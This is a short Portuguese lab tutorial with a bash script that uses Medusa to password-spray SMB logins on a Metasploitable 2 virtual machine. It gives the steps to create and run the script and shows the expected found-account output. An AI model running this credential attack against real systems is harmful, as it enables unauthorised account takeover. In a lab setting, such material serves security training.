Script para fazer Password Spraying usando Medusa.

Crie o arquivo:
'''
nano spray_smb.sh
'''

Cole:

'''
#!/bin/bash

TARGET="192.168.56.101"     # IP da máquina Metasploitable 2
USERLIST="users.txt"        # Lista de usuários
PASSWORD="msfadmin"         # Senha usada no password spraying

echo "[*] Iniciando Password Spraying SMB no alvo $TARGET"
echo "[*] Usando usuário(s) de: $USERLIST"
echo "[*] Senha utilizada: $PASSWORD"
echo ""

medusa -h $TARGET -U $USERLIST -p $PASSWORD -M smbnt
'''


Salve e torne executável:
'''
chmod +x spray_smb.sh
'''

Execute:
'''
./spray_smb.sh
'''

Efeito esperado do script

Você vai ver algo como: "ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin"
